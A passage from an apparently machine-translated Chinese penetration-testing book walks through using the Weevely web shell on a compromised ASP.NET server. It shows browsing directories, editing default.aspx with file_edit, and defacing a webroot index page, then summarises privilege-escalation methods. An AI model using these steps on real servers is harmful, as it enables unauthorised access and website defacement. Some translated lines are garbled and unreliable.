您可以很容易地习惯文件导航命令。这是`ls``/dir`命令和 cd 命令。在某些情况下，这些操作与您可能想象的完全相同，但如果您试图前往 Web 服务器用户无权查看的地方，则可能会失败：

![Using filesystem commands in Weevely](../Images/image00918.jpeg)

遗憾的是，Weevely 不允许我们获得长格式目录列表。它确实给了我们一个类似于前面截图的简短列表，并解释了正在发生的事情：

![Using filesystem commands in Weevely](../Images/image00919.jpeg)

由于它是一个 Windows 文件系统，我们可以猜测没有扩展名的列表项可能是目录，所以让我们进入其中一个目录。本例中为`wolf24`目录，如图所示，如前所示：

![Using filesystem commands in Weevely](../Images/image00920.jpeg)

从这里的文件名可以看出，该子目录是一个 ASP.NET 站点。有一个名为 Umbraco 的文件夹，它是一个.Net CMS 脚本，如果这还不够证明，那么文件夹中有一个`default.aspx`文件。

### 写入文件

有一个命令，允许您在本地计算机上编辑远程文件。命令为`file_edit`：

```
file_edit default.aspx

```

这将在 Kali Linux 中默认情况下在`vi`中打开文件，因此让我们尝试编辑该文件：

![Writing into files](../Images/image00921.jpeg)

在某些服务器上，这将导致在 CMS 中添加另一个指令，该指令可以执行 Web 服务器用户有权执行的任何操作。让我们尝试向服务器写入一个全新的文件：

![Writing into files](../Images/image00922.jpeg)

碰巧，我们的受害者服务器不允许我们上传这个文件。由于我们在另一项行动中获得了系统级访问权限，我们完全可以在开始 Weevely 工作之前确保我们具备该能力：

![Writing into files](../Images/image00923.jpeg)

为了好玩，让我们看看 webroot 是否拥有与`CMS`目录相同的谨慎权限。我们将切换到上面的目录，看看是否可以在那里的`index`文件中添加一行代码：

![Writing into files](../Images/image00924.jpeg)

基于之前使用 Metasploit 更改页面权限，我们成功地实现了页面破坏。Weevely 对于攻击未设置适当权限的站点非常有用：

![Writing into files](../Images/image00925.jpeg)

# 总结

在本章中，您学习了几种提升特权的方法。如果您具有对计算机的物理访问权限，则可以更轻松地攻击计算机，但有几种方法可以通过 web 浏览器将权限提升到权限较弱的计算机：

*   使用 Metasploit 获取访问权限
*   用恶意双胞胎替换可执行文件
*   使用独立工具进行本地权限升级
*   使用物理访问升级权限
*   Weavly 与 Weavly 合作

在下一章中，您将找到更多的方法来在入侵后保持访问，并在数周甚至数年内悄悄地将数据发送出网络。我们向您展示了使用 NetCat、Metasploit 和社会工程工具包获取和维护访问权限的方法。